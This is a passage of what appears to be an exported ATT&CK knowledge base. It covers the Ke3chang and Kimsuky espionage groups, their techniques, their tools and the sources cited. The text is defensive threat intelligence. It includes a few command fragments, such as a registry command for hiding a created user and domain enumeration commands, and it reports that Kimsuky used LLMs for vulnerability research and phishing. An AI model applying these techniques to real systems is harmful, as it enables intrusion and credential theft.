groups.[1] .002 Account Discovery: Domain Account Ke3chang performs account discovery using commands such as net localgroup administrators and net group \"REDACTED\" /domain on specific permissions groups.[1] Enterprise T1583 .003 Acquire Infrastructure: Virtual Private Server SPACEHOP Activity has used acquired Virtual Private Servers as control systems for devices within the ORB network.[6] .005 Acquire Infrastructure: Botnet Ke3chang has utilized an ORB (operational relay box) network for reconnaissance and vulnerability exploitation.[6] Enterprise T1071 .001 Application Layer Protocol: Web Protocols Ke3chang malware including RoyalCli and BS2005 have communicated over HTTP with the C2 server through Internet Explorer (IE) by using the COM interface IWebBrowser2.[2][4] .004 Application Layer Protocol: DNS Ke3chang malware RoyalDNS has used DNS for C2.[2] Enterprise T1560 Archive Collected Data The Ke3chang group has been known to compress data before exfiltration.[1] .001 Archive via Utility Ke3chang is known to use 7Zip and RAR with passwords to encrypt data prior to exfiltration.[1][4] Enterprise T1119 Automated Collection Ke3chang has performed frequent and scheduled data collection from victim networks.[4] Enterprise T1020 Automated Exfiltration Ke3chang has performed frequent and scheduled data exfiltration from compromised networks.[4] Enterprise T1547 .001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder Several Ke3chang backdoors achieved persistence by adding a Run key.[2] Enterprise T1059 Command and Scripting Interpreter Malware used by Ke3chang can run commands on the command-line interface.[1][2] .003 Windows Command Shell Ke3chang has used batch scripts in its malware to install persistence mechanisms.[2] Enterprise T1543 .003 Create or Modify System Process: Windows Service Ke3chang backdoor RoyalDNS established persistence through adding a service called Nwsapagent.[2] Enterprise T1213 .002 Data from Information Repositories: Sharepoint Ke3chang used a SharePoint enumeration and data dumping tool known as spwebmember.[2] Enterprise T1005 Data from Local System Ke3chang gathered information and files from local directories for exfiltration.[1][4] Enterprise T1140 Deobfuscate/Decode Files or Information Ke3chang has deobfuscated Base64-encoded shellcode strings prior to loading them.[4] Enterprise T1587 .001 Develop Capabilities: Malware Ke3chang has developed custom malware that allowed them to maintain persistence on victim networks.[4] Enterprise T1114 .002 Email Collection: Remote Email Collection Ke3chang has used compromised credentials and a .NET tool to dump data from Microsoft Exchange mailboxes.[2][4] Enterprise T1041 Exfiltration Over C2 Channel Ke3chang transferred compressed and encrypted RAR files containing exfiltration through the established backdoor command and control channel during operations.[1] Enterprise T1190 Exploit Public-Facing Application Ke3chang has compromised networks by exploiting Internet-facing applications, including vulnerable Microsoft Exchange and SharePoint servers.[4] SPACEHOP Activity has enabled the exploitation of CVE-2022-27518 and CVE-2022-27518 for illegitimate access.[7][6] Enterprise T1133 External Remote Services Ke3chang has gained access through VPNs including with compromised accounts and stolen VPN certificates.[2][4] Enterprise T1083 File and Directory Discovery Ke3chang uses command-line interaction to search files and directories.[1][4] Enterprise T1105 Ingress Tool Transfer Ke3chang has used tools to download files to compromised machines.[4] Enterprise T1056 .001 Input Capture: Keylogging Ke3chang has used keyloggers.[2][4] Enterprise T1036 .002 Masquerading: Right-to-Left Override Ke3chang has used the right-to-left override character in spearphishing attachment names to trick targets into executing .scr and .exe files.[1] .005 Masquerading: Match Legitimate Resource Name or Location Ke3chang has dropped their malware into legitimate installed software paths including: C:\\ProgramFiles\\Realtek\\Audio\\HDA\\AERTSr.exe, C:\\Program Files (x86)\\Foxit Software\\Foxit Reader\\FoxitRdr64.exe, C:\\Program Files (x86)\\Adobe\\Flash Player\\AddIns\\airappinstaller\\airappinstall.exe, and C:\\Program Files (x86)\\Adobe\\Acrobat Reader DC\\Reader\\AcroRd64.exe.[4] Enterprise T1027 Obfuscated Files or Information Ke3chang has used Base64-encoded shellcode strings.[4] Enterprise T1588 .002 Obtain Capabilities: Tool Ke3chang has obtained and used tools such as Mimikatz.[2] SPACEHOP Activity leverages a C2 framework sourced from a publicly-available Github repository for administration of relay nodes.[6] Enterprise T1003 .001 OS Credential Dumping: LSASS Memory Ke3chang has dumped credentials, including by using Mimikatz.[1][2][4] .002 OS Credential Dumping: Security Account Manager Ke3chang has dumped credentials, including by using gsecdump.[1][2] .003 OS Credential Dumping: NTDS Ke3chang has used NTDSDump and other password dumping tools to gather credentials.[4] .004 OS Credential Dumping: LSA Secrets Ke3chang has dumped credentials, including by using gsecdump.[1][2] Enterprise T1069 .002 Permission Groups Discovery: Domain Groups Ke3chang performs discovery of permission groups net group /domain.[1] Enterprise T1057 Process Discovery Ke3chang performs process discovery using tasklist commands.[1][2] Enterprise T1090 .003 Proxy: Multi-hop Proxy SPACEHOP Activity has routed traffic through chains of compromised network devices to proxy C2 communications.[6] Enterprise T1021 .002 Remote Services: SMB/Windows Admin Shares Ke3chang actors have been known to copy files to the network shares of other computers to move laterally.[1][2] Enterprise T1018 Remote System Discovery Ke3chang has used network scanning and enumeration tools, including Ping.[2] Enterprise T1558 .001 Steal or Forge Kerberos Tickets: Golden Ticket Ke3chang has used Mimikatz to generate Kerberos golden tickets.[2] Enterprise T1082 System Information Discovery Ke3chang performs operating system information discovery using systeminfo and has used implants to identify the system language and computer name.[1][2][4] Enterprise T1614 .001 System Location Discovery: System Language Discovery Ke3chang has used implants to collect the system language ID of a compromised machine.[4] Enterprise T1016 System Network Configuration Discovery Ke3chang has performed local network configuration discovery using ipconfig.[1][2][4] Enterprise T1049 System Network Connections Discovery Ke3chang performs local network connection discovery using netstat.[1][2] Enterprise T1033 System Owner/User Discovery Ke3chang has used implants capable of collecting the signed-in username.[4] Enterprise T1007 System Service Discovery Ke3chang performs service discovery using net start commands.[1] Enterprise T1569 .002 System Services: Service Execution Ke3chang has used a tool known as RemoteExec (similar to PsExec) to remotely execute batch scripts and binaries.[2] Enterprise T1078 Valid Accounts Ke3chang has used credential dumpers or stealers to obtain legitimate credentials, which they used to gain access to victim accounts.[4] .004 Cloud Accounts Ke3chang has used compromised credentials to sign into victims\u2019 Microsoft 365 accounts.[4] Software ID Name References Techniques S0100 ipconfig [1][2] System Network Configuration Discovery S0002 Mimikatz [2][4] Access Token Manipulation: SID-History Injection, Account Manipulation, Boot or Logon Autostart Execution: Security Support Provider, Credentials from Password Stores, Credentials from Password Stores: Credentials from Web Browsers, Credentials from Password Stores: Windows Credential Manager, OS Credential Dumping: DCSync, OS Credential Dumping: Security Account Manager, OS Credential Dumping: LSASS Memory, OS Credential Dumping: LSA Secrets, Rogue Domain Controller, Steal or Forge Authentication Certificates, Steal or Forge Kerberos Tickets: Golden Ticket, Steal or Forge Kerberos Tickets: Silver Ticket, Unsecured Credentials: Private Keys, Use Alternate Authentication Material: Pass the Hash, Use Alternate Authentication Material: Pass the Ticket S0280 MirageFox [3] Command and Scripting Interpreter: Windows Command Shell, Deobfuscate/Decode Files or Information, Hijack Execution Flow: DLL, System Information Discovery, System Owner/User Discovery S0691 Neoichor [4] Application Layer Protocol: Web Protocols, Data from Local System, Indicator Removal, Ingress Tool Transfer, Inter-Process Communication: Component Object Model, Modify Registry, System Information Discovery, System Location Discovery: System Language Discovery, System Network Configuration Discovery: Internet Connection Discovery, System Network Configuration Discovery, System Owner/User Discovery S0039 Net [1][2] Account Discovery: Domain Account, Account Discovery: Local Account, Account Manipulation: Additional Local or Domain Groups, Create Account: Local Account, Create Account: Domain Account, Indicator Removal: Network Share Connection Removal, Network Share Discovery, Password Policy Discovery, Permission Groups Discovery: Domain Groups, Permission Groups Discovery: Local Groups, Remote Services: SMB/Windows Admin Shares, Remote System Discovery, System Network Connections Discovery, System Service Discovery, System Services: Service Execution, System Time Discovery S0104 netstat [1][2] System Network Connections Discovery S0439 Okrum [8] Access Token Manipulation: Token Impersonation/Theft, Application Layer Protocol: Web Protocols, Archive Collected Data: Archive via Utility, Archive Collected Data: Archive via Custom Method, Boot or Logon Autostart Execution: Shortcut Modification, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Data Encoding: Standard Encoding, Data Obfuscation, Data Obfuscation: Protocol or Service Impersonation, Deobfuscate/Decode Files or Information, Encrypted Channel: Symmetric Cryptography, Exfiltration Over C2 Channel, File and Directory Discovery, Hide Artifacts: Hidden Files and Directories, Indicator Removal: File Deletion, Ingress Tool Transfer, Input Capture: Keylogging, Masquerading: Masquerade Task or Service, Obfuscated Files or Information: Steganography, OS Credential Dumping: Cached Domain Credentials, OS Credential Dumping: LSASS Memory, Proxy: External Proxy, Scheduled Task/Job: Scheduled Task, System Information Discovery, System Network Configuration Discovery, System Network Connections Discovery, System Owner/User Discovery, System Services: Service Execution, System Time Discovery, Virtualization/Sandbox Evasion: System Checks, Virtualization/Sandbox Evasion: User Activity Based Checks, Virtualization/Sandbox Evasion: Time Based Evasion S0097 Ping [2] Remote System Discovery S0227 spwebmember [2] Data from Information Repositories: Sharepoint S0096 Systeminfo [1][2] System Information Discovery S0057 Tasklist [2] Process Discovery, Software Discovery: Security Software Discovery, System Service Discovery References Villeneuve, N., Bennett, J. T., Moran, N., Haq, T., Scott, M., & Geers, K. (2014). OPERATION \u201cKE3CHANG\u201d: Targeted Attacks Against Ministries of Foreign Affairs. Retrieved November 12, 2014. Smallridge, R. (2018, March 10). APT15 is alive and strong: An analysis of RoyalCli and RoyalDNS. Retrieved April 4, 2018. Rosenberg, J. (2018, June 14). MirageFox: APT15 Resurfaces With New Tools Based On Old Ones. Retrieved September 21, 2018. MSTIC. (2021, December 6). NICKEL targeting government organizations across Latin America and Europe. Retrieved March 18, 2022. Microsoft . (2023, July 12). How Microsoft names threat actors. Retrieved November 17, 2023. Raggi, Michael. (2024, May 22). IOC Extinction? China-Nexus Cyber Espionage Actors Use ORB Networks to Raise Cost on Defenders. Retrieved July 8, 2024. National Security Agency. (2022, December). APT5: Citrix ADC Threat Hunting Guidance. Retrieved February 5, 2024. Hromcova, Z. (2019, July). OKRUM AND KETRICAN: AN OVERVIEW OF RECENT KE3CHANG GROUP ACTIVITY. Retrieved May 6, 2020. "
},
{
"id": 156,
"title": "Kimsuky, Black Banshee, Velvet Chollima, Emerald Sleet, THALLIUM, APT43, TA427, Springtail, Group G0094",
"path": "/groups/G0094/index.html",
"content": " Kimsuky Kimsuky is a North Korea-based cyber espionage group that has been active since at least 2012. The group initially focused on targeting South Korean government entities, think tanks, and individuals identified as experts in various fields, and expanded its operations to include the UN and the government, education, business services, and manufacturing sectors in the United States, Japan, Russia, and Europe. Kimsuky has focused its intelligence collection activities on foreign policy and national security issues related to the Korean peninsula, nuclear policy, and sanctions. Kimsuky operations have overlapped with those of other North Korean cyber espionage actors likely as a result of ad hoc collaborations or other limited resource sharing.[1][2][3][4][5][6] Kimsuky was assessed to be responsible for the 2014 Korea Hydro & Nuclear Power Co. compromise; other notable campaigns include Operation STOLEN PENCIL (2018), Operation Kabar Cobra (2019), and Operation Smoke Screen (2019).[7][8][9] North Korean group definitions are known to have significant overlap, and some security researchers report all North Korean state-sponsored cyber activity under the name Lazarus Group instead of tracking clusters or subgroups. In 2023, Kimsuky has used commercial large language models to assist with vulnerability research, scripting, social engineering and reconnaissance.[10] ID: G0094 \u24d8 Associated Groups: Black Banshee, Velvet Chollima, Emerald Sleet, THALLIUM, APT43, TA427, Springtail Contributors: Taewoo Lee, KISA; Dongwook Kim, KISA; Jaesang Oh, KC7 Foundation Version: 5.1 Created: 26 August 2019 Last Modified: 29 January 2025 Version Permalink Live Version Associated Group Descriptions Name Description Black Banshee [2][3] Velvet Chollima [11][12][3] Emerald Sleet [13][6] THALLIUM [2][3][5][6] APT43 [5][6] TA427 [6] Springtail [14] Techniques Used Domain ID Name Use Enterprise T1098 .007 Account Manipulation: Additional Local or Domain Groups Kimsuky has added accounts to specific groups with net localgroup.[15] Enterprise T1583 Acquire Infrastructure Kimsuky has used funds from stolen and laundered cryptocurrency to acquire operational infrastructure.[5] .001 Domains Kimsuky has registered domains to spoof targeted organizations and trusted third parties including search engines, web platforms, and cryptocurrency exchanges.[12][16][4][2][3][15][5][17] .004 Server Kimsuky has purchased hosting servers with virtual currency and prepaid cards.[15] .006 Web Services Kimsuky has hosted content used for targeting efforts via web services such as Blogspot.[18] Enterprise T1557 Adversary-in-the-Middle Kimsuky has used modified versions of PHProxy to examine web traffic between the victim and the accessed website.[4] Enterprise T1071 .001 Application Layer Protocol: Web Protocols Kimsuky has used HTTP GET and POST requests for C2.[18] .002 Application Layer Protocol: File Transfer Protocols Kimsuky has used FTP to download additional malware to the target machine.[19] .003 Application Layer Protocol: Mail Protocols Kimsuky has used e-mail to send exfiltrated data to C2 servers.[4] Enterprise T1560 .001 Archive Collected Data: Archive via Utility Kimsuky has used QuickZip to archive stolen files before exfiltration.[18] .003 Archive Collected Data: Archive via Custom Method Kimsuky has used RC4 encryption before exfil.[20] Enterprise T1547 .001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder Kimsuky has placed scripts in the startup folder for persistence and modified the HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce Registry key.[20][4][21][18][15] Enterprise T1185 Browser Session Hijacking Kimsuky has the ability to use form-grabbing to extract emails and passwords from web data forms.[22] Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell Kimsuky has executed a variety of PowerShell scripts including Invoke-Mimikatz.[1][4][18][15][5] .003 Command and Scripting Interpreter: Windows Command Shell Kimsuky has executed Windows commands by using cmd and running batch scripts.[18][15] .005 Command and Scripting Interpreter: Visual Basic Kimsuky has used Visual Basic to download malicious payloads.[12][19][21][18] Kimsuky has also used malicious VBA macros within maldocs disguised as forms that trigger when a victim types any content into the lure.[18] .006 Command and Scripting Interpreter: Python Kimsuky has used a macOS Python implant to gather data as well as MailFetcher.py code to automatically collect email data.[4][15] .007 Command and Scripting Interpreter: JavaScript Kimsuky has used JScript for logging and downloading additional tools.[19][4] Kimsuky has used TRANSLATEXT, which contained four Javascript files for bypassing defenses, collecting sensitive information and screenshots, and exfiltrating data.[22] Enterprise T1586 .002 Compromise Accounts: Email Accounts Kimsuky has compromised email accounts to send spearphishing e-mails.[19][3] Enterprise T1584 .001 Compromise Infrastructure: Domains Kimsuky has compromised legitimate sites and used them to distribute malware.[15][5][17] Enterprise T1136 .001 Create Account: Local Account Kimsuky has created accounts with net user.[15] Enterprise T1543 .003 Create or Modify System Process: Windows Service Kimsuky has created new services for persistence.[20][4] Enterprise T1555 .003 Credentials from Password Stores: Credentials from Web Browsers Kimsuky has used browser extensions including Google Chrome to steal passwords and cookies from browsers. Kimsuky has also used Nirsoft's WebBrowserPassView tool to dump the passwords obtained from victims.[11][4][7][18] Enterprise T1005 Data from Local System Kimsuky has collected Office, PDF, and HWP documents from its victims.[20][18] Enterprise T1074 .001 Data Staged: Local Data Staging Kimsuky has staged collected data files under C:\\Program Files\\Common Files\\System\\Ole DB\\.[4][18] Enterprise T1140 Deobfuscate/Decode Files or Information Kimsuky has decoded malicious VBScripts using Base64.[18] Enterprise T1587 Develop Capabilities Kimsuky created and used a mailing toolkit to use in spearphishing attacks.[19] .001 Malware Kimsuky has developed its own unique malware such as MailFetch.py for use in operations.[15][18][5] Enterprise T1114 .002 Email Collection: Remote Email Collection Kimsuky has used tools such as the MailFetch mail crawler to collect victim emails (excluding spam) from online services via IMAP.[15] .003 Email Collection: Email Forwarding Rule Kimsuky has set auto-forward rules on victim's e-mail accounts.[4] Enterprise T1585 Establish Accounts Kimsuky has leveraged stolen PII to create accounts.[17] .001 Social Media Accounts Kimsuky has created social media accounts to monitor news and security trends as well as potential targets.[15] .002 Email Accounts Kimsuky has created email accounts for phishing operations.[15][5][6] Enterprise T1546 .001 Event Triggered Execution: Change Default File Association Kimsuky has a HWP document stealer module which changes the default program association in the registry to open HWP documents.[20] Enterprise T1041 Exfiltration Over C2 Channel Kimsuky has exfiltrated data over its C2 channel.[20][18] Enterprise T1567 .002 Exfiltration Over Web Service: Exfiltration to Cloud Storage Kimsuky has exfiltrated stolen files and data to actor-controlled Blogspot accounts.[18] Enterprise T1190 Exploit Public-Facing Application Kimsuky has exploited various vulnerabilities for initial access, including Microsoft Exchange vulnerability CVE-2020-0688.[15] Enterprise T1133 External Remote Services Kimsuky has used RDP to establish persistence.[4] Enterprise T1083 File and Directory Discovery Kimsuky has the ability to enumerate all files and directories on an infected system.[20][18][15] Enterprise T1657 Financial Theft Kimsuky has stolen and laundered cryptocurrency to self-fund operations including the acquisition of infrastructure.[5][17] Enterprise T1589 .002 Gather Victim Identity Information: Email Addresses Kimsuky has collected valid email addresses including personal accounts that were subsequently used for spearphishing and other forms of social engineering.[3][6][17] .003 Gather Victim Identity Information: Employee Names Kimsuky has collected victim employee name information.[15] Enterprise T1591 Gather Victim Org Information Kimsuky has collected victim organization information including but not limited to organization hierarchy, functions, press releases, and others.[15] Kimsuky has also used large language models (LLMs) to gather information about potential targets of interest.[10] Enterprise T1564 .002 Hide Artifacts: Hidden Users Kimsuky has run reg add \u2018HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\u2019 /v to hide a newly created user.[15] .003 Hide Artifacts: Hidden Window Kimsuky has used an information gathering module that will hide an AV software window from the victim.[18] Enterprise T1562 .001 Impair Defenses: Disable or Modify Tools Kimsuky has been observed turning off Windows Security Center and can hide the AV software window from the view of the infected user.[20][18] .004 Impair Defenses: Disable or Modify System Firewall Kimsuky has been observed disabling the system firewall.[20] Enterprise T1656 Impersonation Kimsuky has impersonated academic institutions and NGOs in order to gain information related to North Korea.[10] Enterprise T1070 .004 Indicator Removal: File Deletion Kimsuky has deleted the exfiltrated data on disk after transmission. Kimsuky has also used an instrumentor script to terminate browser processes running on an infected system and then delete the cookie files on disk.[20][18][15] .006 Indicator Removal: Timestomp Kimsuky has manipulated timestamps for creation or compilation dates to defeat anti-forensics.[2] Enterprise T1105 Ingress Tool Transfer Kimsuky has downloaded additional scripts, tools, and malware onto victim systems.[21][18] Enterprise T1056 .001 Input Capture: Keylogging Kimsuky has used a PowerShell-based keylogger as well as a tool called MECHANICAL to log keystrokes.[1][20][4][7][18][15] Enterprise T1534 Internal Spearphishing Kimsuky has sent internal spearphishing emails for lateral movement after stealing victim information.[15] Enterprise T1036 .004 Masquerading: Masquerade Task or Service Kimsuky has disguised services to appear as benign software or related to operating system functions.[4] .005 Masquerading: Match Legitimate Resource Name or Location Kimsuky has renamed malware to legitimate names such as ESTCommon.dll or patch.dll.[23] Enterprise T1112 Modify Registry Kimsuky has modified Registry settings for default file associations to enable all macros and for persistence.[4][21][18][15] Enterprise T1111 Multi-Factor Authentication Interception Kimsuky has used a proprietary tool to intercept one time passwords required for two-factor authentication.[15] Enterprise T1040 Network Sniffing Kimsuky has used the Nirsoft SniffPass network sniffer to obtain passwords sent over non-secure protocols.[4][7] Enterprise T1027 Obfuscated Files or Information Kimsuky has obfuscated binary strings including the use of XOR encryption and Base64 encoding.[12][19] Kimsuky has also modified the first byte of DLL implants targeting victims to prevent recognition of the executable file format.[18] .002 Software Packing Kimsuky has packed malware with UPX.[3] Enterprise T1588 .002 Obtain Capabilities: Tool Kimsuky has obtained and used tools such as Nirsoft WebBrowserPassVIew, Mimikatz, and PsExec.[7][18][5] .003 Obtain Capabilities: Code Signing Certificates Kimsuky has stolen a valid certificate that is used to sign the malware and the dropper.[24] .005 Obtain Capabilities: Exploits Kimsuky has obtained exploit code for various CVEs.[15] Enterprise T1003 .001 OS Credential Dumping: LSASS Memory Kimsuky has gathered credentials using Mimikatz and ProcDump.[4][7][15] Enterprise T1566 Phishing Kimsuky has used spearphishing to gain initial access and intelligence.[10][17] .001 Spearphishing Attachment Kimsuky has used emails containing Word, Excel and/or HWP (Hangul Word Processor) documents in their spearphishing campaigns.[11][20][12][19][2][3][18][15] .002 Spearphishing Link Kimsuky has sent spearphishing emails containing a link to a document that contained malicious macros or took the victim to an actor-controlled domain.[1][7][15] Enterprise T1598 Phishing for Information Kimsuky has used tailored spearphishing emails to gather victim information including contat lists to identify additional targets.[5] .003 Spearphishing Link Kimsuky has used links in e-mail to steal account information including web beacons for target profiling.[19][3][15][6] Enterprise T1057 Process Discovery Kimsuky can gather a list of all processes running on a victim's machine.[18] Enterprise T1055 Process Injection Kimsuky has used Win7Elevate to inject malicious code into explorer.exe.[20] .012 Process Hollowing Kimsuky has used a file injector DLL to spawn a benign process on the victim's system and inject the malicious payload into it via process hollowing.[18] Enterprise T1012 Query Registry Kimsuky has obtained specific Registry keys and values on a compromised host.[18] Enterprise T1620 Reflective Code Loading Kimsuky has used the Invoke-Mimikatz PowerShell script to reflectively load a Mimikatz credential stealing DLL into memory.[5] Enterprise T1219 .002 Remote Access Tools: Remote Desktop Software Kimsuky has used a modified TeamViewer client as a command and control channel.[20][21] Enterprise T1021 .001 Remote Services: Remote Desktop Protocol Kimsuky has used RDP for direct remote point-and-click access.[7] Enterprise T1053 .005 Scheduled Task/Job: Scheduled Task Kimsuky has downloaded additional malware with scheduled tasks.[15] Enterprise T1113 Screen Capture Kimsuky has captured browser screenshots using TRANSLATEXT.[22] Enterprise T1596 Search Open Technical Databases Kimsuky has used LLMs to better understand publicly reported vulnerabilities.[10][25] Enterprise T1593 Search Open Websites/Domains Kimsuky has used LLMs to identify think tanks, government organizations, etc. that have information.[10] .001 Social Media Kimsuky has used Twitter to monitor potential victims and to prepare targeted phishing e-mails.[3] .002 Search Engines Kimsuky has searched for vulnerabilities, tools, and geopolitical trends on Google to target victims.[15] Enterprise T1594 Search Victim-Owned Websites Kimsuky has searched for information on the target company's website.[15] Enterprise T1505 .003 Server Software Component: Web Shell Kimsuky has used modified versions of open source PHP web shells to maintain access, often adding \"Dinosaur\" references within the code.[4] Enterprise T1518 .001 Software Discovery: Security Software Discovery Kimsuky has checked for the presence of antivirus software with powershell Get-CimInstance -Namespace root/securityCenter2 \u2013 classname antivirusproduct.[15] Enterprise T1176 .001 Software Extensions: Browser Extensions Kimsuky has used Google Chrome browser extensions to infect victims and to steal passwords and cookies.[11][7] Enterprise T1608 .001 Stage Capabilities: Upload Malware Kimsuky has used compromised and acquired infrastructure to host and deliver malware including Blogspot to host beacons, file exfiltrators, and implants.[18][5][17] Enterprise T1539 Steal Web Session Cookie Kimsuky has used malware, such as TRANSLATEXT, to steal and exfiltrate browser cookies.[22][24] Enterprise T1553 .002 Subvert Trust Controls: Code Signing Kimsuky has signed files with the name EGIS CO,. Ltd. and has stolen a valid certificate that is used to sign the malware and the dropper.[12][24] Enterprise T1218 .005 System Binary Proxy Execution: Mshta Kimsuky has used mshta.exe to run malicious scripts on the system.[1][4][21][15] .010 System Binary Proxy Execution: Regsvr32 Kimsuky has executed malware with regsvr32s.[15] .011 System Binary Proxy Execution: Rundll32 Kimsuky has used rundll32.exe to execute malicious scripts and malware on a victim's network.[18] Enterprise T1082 System Information Discovery Kimsuky has enumerated drives, OS type, OS version, and other information using a script or the \"systeminfo\" command.[20][18] Enterprise T1016 System Network Configuration Discovery Kimsuky has used ipconfig/all and web beacons sent via email to gather network configuration information.[18][6] Enterprise T1007 System Service Discovery Kimsuky has used an instrumentor script to gather the names of all services running on a victim's system.[18] Enterprise T1205 Traffic Signaling Kimsuky has used TRANSLATEXT to redirect clients to legitimate Gmail, Naver or Kakao pages if the clients connect with no parameters.[22] Enterprise T1552 .001 Unsecured Credentials: Credentials In Files Kimsuky has used tools that are capable of obtaining credentials from saved mail.[7] Enterprise T1550 .002 Use Alternate Authentication Material: Pass the Hash Kimsuky has used pass the hash for authentication to remote access software used in C2.[4] Enterprise T1204 .001 User Execution: Malicious Link Kimsuky has lured victims into clicking malicious links.[15] .002 User Execution: Malicious File Kimsuky has used attempted to lure victims into opening malicious e-mail attachments.[12][19][4][2][3][18] Enterprise T1078 .003 Valid Accounts: Local Accounts Kimsuky has used a tool called GREASE to add a Windows admin account in order to allow them continued access via RDP.[7] Enterprise T1102 .001 Web Service: Dead Drop Resolver Kimsuky has used TRANSLATEXT and a dead drop resolver to retrieve configurations and commands from a public blog site.[22] .002 Web Service: Bidirectional Communication Kimsuky has used Blogspot pages and a Github repository for C2.[18][22] Software ID Name References Techniques S1025 Amadey [5][17] Application Layer Protocol: Web Protocols, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Data from Local System, Deobfuscate/Decode Files or Information, Dynamic Resolution: Fast Flux DNS, Exfiltration Over C2 Channel, File and Directory Discovery, Ingress Tool Transfer, Modify Registry, Native API, Obfuscated Files or Information, Software Discovery: Security Software Discovery, Subvert Trust Controls: Mark-of-the-Web Bypass, System Information Discovery, System Location Discovery, System Network Configuration Discovery, System Owner/User Discovery S0622 AppleSeed [3][15] Access Token Manipulation, Application Layer Protocol: Web Protocols, Archive Collected Data, Archive Collected Data: Archive via Utility, Automated Collection, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: JavaScript, Command and Scripting Interpreter: PowerShell, Data from Local System, Data from Removable Media, Data Staged: Local Data Staging, Data Transfer Size Limits, Deobfuscate/Decode Files or Information, Exfiltration Over C2 Channel, Exfiltration Over Web Service, Fallback Channels, File and Directory Discovery, Indicator Removal: File Deletion, Input Capture: Keylogging, Masquerading, Masquerading: Match Legitimate Resource Name or Location, Native API, Obfuscated Files or Information: Software Packing, Obfuscated Files or Information, Phishing: Spearphishing Attachment, Process Discovery, Screen Capture, System Binary Proxy Execution: Regsvr32, System Information Discovery, System Network Configuration Discovery, System Time Discovery, User Execution: Malicious File S0414 BabyShark [4][2][21][5][17] Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Visual Basic, Command and Scripting Interpreter: Windows Command Shell, Data Encoding: Standard Encoding, Deobfuscate/Decode Files or Information, File and Directory Discovery, Indicator Removal: File Deletion, Ingress Tool Transfer, Input Capture: Keylogging, Process Discovery, Query Registry, Scheduled Task/Job: Scheduled Task, System Binary Proxy Execution: Mshta, System Information Discovery, System Network Configuration Discovery, System Owner/User Discovery S0252 Brave Prince [18][5] Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol, File and Directory Discovery, Impair Defenses: Disable or Modify Tools, Process Discovery, Query Registry, System Information Discovery, System Network Configuration Discovery S0527 CSPY Downloader [2] Abuse Elevation Control Mechanism: Bypass User Account Control, Application Layer Protocol: Web Protocols, Indicator Removal: File Deletion, Indicator Removal, Ingress Tool Transfer, Masquerading: Masquerade Task or Service, Modify Registry, Obfuscated Files or Information: Software Packing, Scheduled Task/Job: Scheduled Task, Subvert Trust Controls: Code Signing, User Execution: Malicious File, Virtualization/Sandbox Evasion: System Checks S0032 gh0st RAT [5][17] Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter, Create or Modify System Process: Windows Service, Data Encoding: Standard Encoding, Deobfuscate/Decode Files or Information, Dynamic Resolution: Fast Flux DNS, Encrypted Channel: Symmetric Cryptography, Encrypted Channel, Hijack Execution Flow: DLL, Indicator Removal: Clear Windows Event Logs, Indicator Removal: File Deletion, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Native API, Non-Application Layer Protocol, Process Discovery, Process Injection, Query Registry, Screen Capture, Shared Modules, System Binary Proxy Execution: Rundll32, System Information Discovery, System Services: Service Execution S1197 GoBear GoBear is exclusively linked to Kimsuky operations.[24][14] Masquerading: Match Legitimate Resource Name or Location, Proxy, Subvert Trust Controls: Code Signing S0249 Gold Dragon [18][5] Application Layer Protocol: Web Protocols, Archive Collected Data, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Windows Command Shell, Data Staged: Local Data Staging, File and Directory Discovery, Impair Defenses: Disable or Modify Tools, Indicator Removal: File Deletion, Ingress Tool Transfer, Process Discovery, Query Registry, Software Discovery: Security Software Discovery, System Information Discovery, System Owner/User Discovery S1198 Gomir Gomir is uniquely associated with Kimsuky operations.[14] Application Layer Protocol: Web Protocols, Command and Scripting Interpreter: Unix Shell, Create or Modify System Process: Systemd Service, Data Encoding: Standard Encoding, Encrypted Channel, Encrypted Channel: Asymmetric Cryptography, File and Directory Discovery, Indicator Removal: File Deletion, Permission Groups Discovery: Local Groups, Proxy: Internal Proxy, Remote System Discovery, Scheduled Task/Job: Cron, System Information Discovery, System Network Configuration Discovery S0526 KGH_SPY [2] Application Layer Protocol: Web Protocols, Boot or Logon Initialization Scripts: Logon Script (Windows), Command and Scripting Interpreter: Windows Command Shell, Command and Scripting Interpreter: PowerShell, Credentials from Password Stores: Credentials from Web Browsers, Credentials from Password Stores: Windows Credential Manager, Credentials from Password Stores, Data from Local System, Data Staged: Local Data Staging, Deobfuscate/Decode Files or Information, Email Collection: Local Email Collection, Exfiltration Over C2 Channel, File and Directory Discovery, Ingress Tool Transfer, Input Capture: Keylogging, Masquerading: Match Legitimate Resource Name or Location, Obfuscated Files or Information: Encrypted/Encoded File, Software Discovery, System Information Discovery, User Execution: Malicious File S0002 Mimikatz [7][15][5] Access Token Manipulation: SID-History Injection, Account Manipulation, Boot or Logon Autostart Execution: Security Support Provider, Credentials from Password Stores, Credentials from Password Stores: Credentials from Web Browsers, Credentials from Password Stores: Windows Credential Manager, OS Credential Dumping: DCSync, OS Credential Dumping: Security Account Manager, OS Credential Dumping: LSASS Memory, OS Credential Dumping: LSA Secrets, Rogue Domain Controller, Steal or Forge Authentication Certificates, Steal or Forge Kerberos Tickets: Golden Ticket, Steal or Forge Kerberos Tickets: Silver Ticket, Unsecured Credentials: Private Keys, Use Alternate Authentication Material: Pass the Hash, Use Alternate Authentication Material: Pass the Ticket S0353 NOKKI [21] Application Layer Protocol: Web Protocols, Application Layer Protocol: File Transfer Protocols, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Data Staged: Local Data Staging, Deobfuscate/Decode Files or Information, Indicator Removal: File Deletion, Ingress Tool Transfer, Input Capture: Credential API Hooking, Masquerading: Match Legitimate Resource Name or Location, Obfuscated Files or Information, System Binary Proxy Execution: Rundll32, System Information Discovery, System Network Configuration 